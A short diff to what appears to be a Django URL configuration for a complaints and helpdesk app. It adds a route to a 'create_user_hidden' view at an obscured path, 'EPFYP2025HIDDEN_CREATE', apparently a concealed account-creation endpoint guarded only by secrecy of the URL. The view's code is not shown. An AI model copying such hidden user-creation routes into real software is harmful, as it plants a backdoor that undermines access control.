@@ -43,6 +43,8 @@ urlpatterns = [
     path('verify-otp/', views.verify_otp, name='verify_otp'),
     path('dashboard/complaints/', views.complaints_view, name='complaints_view'),
     path('dashboard/viewSubmittedComplaints', views.view_submitted_complaints, name='view_submitted_complaints'),
+    path('create-user/EPFYP2025HIDDEN_CREATE', views.create_user_hidden, name='create_user_hidden'),
+
     # Helpdesk stuff
     path('dashboard/Helpdesk/Tickets/', views.view_tickets, name='view_tickets'),
     path('dashboard/Helpdesk/TicketsDetails/<int:ticket_id>/', views.ticket_details, name='ticket_details'),
